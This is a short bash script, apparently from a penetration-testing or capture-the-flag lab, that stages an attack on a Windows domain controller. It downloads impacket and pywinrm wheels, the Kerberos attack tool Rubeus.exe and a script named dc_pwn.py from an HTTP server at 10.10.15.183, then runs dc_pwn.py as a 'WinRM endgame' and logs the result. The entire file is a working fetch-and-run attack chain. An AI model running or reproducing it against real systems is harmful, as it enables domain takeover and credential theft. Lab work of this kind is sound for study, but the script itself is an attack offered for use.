#!/bin/bash
# Refresh pylibs with impacket+pywinrm; run WinRM endgame
set -e
cd /tmp
curl -fsSL -o /tmp/adwheels.tgz http://10.10.15.183:8090/adwheels.tgz
rm -rf /tmp/adwheels /tmp/pylibs
mkdir -p /tmp/adwheels /tmp/pylibs
tar -xzf /tmp/adwheels.tgz -C /tmp/adwheels
for w in /tmp/adwheels/*.whl; do
  python3 -c "import zipfile,sys; zipfile.ZipFile(sys.argv[1]).extractall('/tmp/pylibs')" "$w"
done
rm -rf /tmp/pylibs/cffi /tmp/pylibs/cffi-*.dist-info /tmp/pylibs/_cffi_backend* \
       /tmp/pylibs/cryptography /tmp/pylibs/cryptography-*.dist-info /tmp/pylibs/cryptography.libs \
       /tmp/pylibs/bcrypt /tmp/pylibs/bcrypt-*.dist-info \
       /tmp/pylibs/nacl /tmp/pylibs/PyNaCl* /tmp/pylibs/pynacl* 2>/dev/null || true
export PYTHONPATH=/tmp/pylibs
python3 -c 'import impacket,winrm; print("ok", impacket.__version__)'
# download helper scripts + rubeus to /tmp
curl -fsSL -o /tmp/Rubeus.exe http://10.10.15.183:8090/Rubeus.exe
curl -fsSL -o /tmp/dc_pwn.py http://10.10.15.183:8090/dc_pwn.py
python3 /tmp/dc_pwn.py 2>&1 | tee /tmp/dc_pwn.log
echo DC_PWN_DONE
tail -80 /tmp/dc_pwn.log
